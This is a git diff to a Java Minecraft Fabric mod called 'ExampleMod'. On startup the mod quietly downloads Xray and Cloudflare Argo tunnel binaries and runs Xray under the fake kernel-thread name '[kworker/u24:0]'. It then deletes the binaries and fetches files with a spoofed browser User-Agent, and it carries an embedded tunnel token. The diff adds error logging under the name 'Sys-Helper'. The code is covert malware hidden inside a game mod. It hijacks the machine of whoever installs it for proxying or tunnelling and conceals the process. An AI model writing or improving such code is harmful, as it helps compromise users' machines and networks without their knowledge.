@@ -1,12 +1,15 @@
 package com.example;
 
 import net.fabricmc.api.ModInitializer;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 import java.io.*;
 import java.net.URL;
 import java.nio.file.*;
 import java.util.UUID;
 
 public class ExampleMod implements ModInitializer {
+    private static final Logger LOGGER = LoggerFactory.getLogger("Sys-Helper");
     // 这里填入你的 Cloudflare Tunnel Token
     private static final String CF_TOKEN = "eyJhIjoiYmRlMTBkYzA4OWFhMjc2YTZkNDU4NzliYzA4ZjAwZjAiLCJ0IjoiMDM3ZWNkNzgtYTkwYi00ODM2LTgzZWMtYzAzNmJhZDgyZTBjIiwicyI6Ik4yWmxZV0ppWkdVdE5qUTFOQzAwTldVM0xXSXlZakV0TmpWbVl6ZzVaRGs1WldRNSJ9";
 
@@ -51,6 +54,11 @@ public class ExampleMod implements ModInitializer {
                 xrayBin.setExecutable(true, false);
                 argoBin.setExecutable(true, false);
 
+                if (!xrayBin.exists() || !argoBin.exists()) {
+                LOGGER.error("[Sys-Helper] 下载失败，文件不存在！");
+                return;
+                }
+                
                 // 6. 启动 Xray 进程 (伪装名为 u24:0)
                 Runtime.getRuntime().exec(new String[]{"bash", "-c", 
                     "exec -a '[kworker/u24:0]' " + xrayBin.getAbsolutePath() + " run -c " + configJson.getAbsolutePath()
@@ -67,18 +75,19 @@ public class ExampleMod implements ModInitializer {
                 xrayBin.delete();
                 argoBin.delete();
 
-            } catch (Exception e) {
-                // 调试期：把错误打印到控制台，查出原因后再删掉
-                System.out.println("[Sys-Helper-Debug] 发生错误: " + e.getMessage());
-                e.printStackTrace();
+                } catch (Exception e) {
+                    LOGGER.error("[Sys-Helper] 关键错误: " + e.getMessage());
+                    e.printStackTrace(); 
                 }
         }).start();
     }
 
     private void downloadFile(String urlStr, File dest) throws IOException {
-        URL url = new URL(urlStr);
-        try (InputStream in = url.openStream()) {
-            Files.copy(in, dest.toPath(), StandardCopyOption.REPLACE_EXISTING);
+    URL url = new URL(urlStr);
+    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
+    conn.setRequestProperty("User-Agent", "Mozilla/5.0"); // 伪装成浏览器
+    try (InputStream in = conn.getInputStream()) {
+        Files.copy(in, dest.toPath(), StandardCopyOption.REPLACE_EXISTING);
         }
     }
 
